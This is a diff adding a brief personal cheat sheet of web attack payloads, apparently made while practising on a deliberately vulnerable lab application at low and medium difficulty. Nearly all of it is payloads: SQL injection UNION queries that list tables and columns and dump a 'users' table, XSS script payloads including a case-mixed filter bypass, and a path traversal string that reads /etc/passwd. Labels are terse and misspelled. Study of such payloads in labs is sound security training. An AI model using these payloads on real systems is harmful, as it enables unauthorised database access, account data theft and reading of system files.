@@ -1,0 +1,32 @@
+error occure
+' union select table_name from information_schema.tables # error
+to know all tables names 
+' union select table_name,null from information_schema.tables #
+to know all columns name
+' union select column_name,null from information_schema.columns #
+all columns names from certain tables 
+' union select column_name,null from information_schema.columns where table_name='users'#
+columns contant from certain table 
+' union select user, first_name from users#
+
+
+
+in madium
+1 union select table_name from information_schema.tables # error
+1 union select table_name,null from information_schema.tables #
+1 union select column_name,null from information_schema.columns #
+1 union select column_name,null from information_schema.columns where table_name='users'#
+1 union select user, first_name from users#
+
+
+
+XSS "reflected & stored"
+<script>alert(1)</script>
+<script>alert('Hamdy')</script>
+meduim
+<scRIpt>alert('Hamdy')</scRipT>
+
+
+file inclusion
+
+../../../../../../etc/passwd
